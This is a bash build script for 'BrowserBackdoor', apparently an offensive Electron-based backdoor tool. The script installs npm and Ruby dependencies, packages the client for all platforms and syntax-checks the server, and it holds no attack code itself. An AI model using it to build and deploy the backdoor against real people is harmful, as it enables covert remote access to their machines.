#!/bin/bash
#
# Copyright (c) 2016 Carleton Stuberg - http://imcpwn.com
# BrowserBackdoor by IMcPwn.
# See the file 'LICENSE' for copying permission
#

set -e

echo "Entering client directory"
cd client
echo "Installing npm dependencies"
npm install
echo "Running electron-packager . --all"
electron-packager . --all
echo "Returning to root of project"
cd -

echo "Entering server directory"
cd server
echo "Installing ruby dependencies"
bundle install
echo "Checking ruby syntax"
ruby -c ./*.rb
echo "Returning to root of project"
cd -
